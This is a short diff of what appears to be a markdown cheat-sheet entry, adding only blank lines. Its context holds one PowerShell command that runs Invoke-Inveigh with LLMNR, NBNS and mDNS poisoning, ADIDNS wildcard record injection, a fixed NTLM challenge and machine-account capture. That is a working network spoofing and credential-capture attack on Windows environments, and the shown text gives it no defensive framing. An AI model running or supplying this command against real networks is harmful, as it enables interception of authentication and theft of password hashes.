@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:26:13.841497+00:00'
 ```ps1
 Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y
 ```
+
+
